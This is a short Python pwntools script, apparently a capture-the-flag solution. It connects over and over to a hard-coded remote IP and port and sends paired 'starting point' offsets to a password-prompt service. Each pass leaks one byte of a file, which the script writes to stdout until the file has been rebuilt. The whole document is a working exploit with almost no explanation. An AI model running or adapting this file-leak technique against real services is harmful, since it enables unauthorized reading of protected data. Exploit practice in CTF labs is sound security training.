#!/usr/bin/python3

from pwn import *
import sys

context.log_level = 'error'
context.log_console = sys.stderr

IP = '34.89.232.255'
port = 31488
def test():
    r = remote(IP, port)

    # enter starting point
    r.recvuntil('Enter starting point: ')
    data = bytes(str(3590), 'UTF-8')
    r.sendline(data)
    
    # enter starting point 2
    r.recvuntil("Enter starting point: ")
    data = bytes(str(3600), 'UTF-8')
    r.sendline(data)
    
    # get our number echoed back then the part from the file
    r.recvuntil('\x89', drop=True)
    data = r.recvuntil('\r\nEnter the password: ', drop=True)
    print(data)
def main():
    sys.stdout.buffer.write(b'\x89')
    for i in range(1, 3500):
        try:
            r = remote(IP, port)
        except:
            sleep(2)
            i = i-1
            continue
        

        # enter starting point
        r.recvuntil('Enter starting point: ')
        data = bytes(str(i), 'UTF-8')
        r.sendline(data)
        
        # enter starting point 2
        r.recvuntil("Enter starting point: ")
        data = bytes(str(i+1), 'UTF-8')
        r.sendline(data)
        
        # get our number echoed back then the part from the file
        r.recvuntil('\x89', drop=True)
        
        data = r.recvuntil('\r\nEnter the password: ', drop=True)
        if len(data) == 1:
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
        else:
            sys.stdout.buffer.write(b'\n')
            sys.stdout.buffer.flush()
        r.close()


if __name__== "__main__":
    main()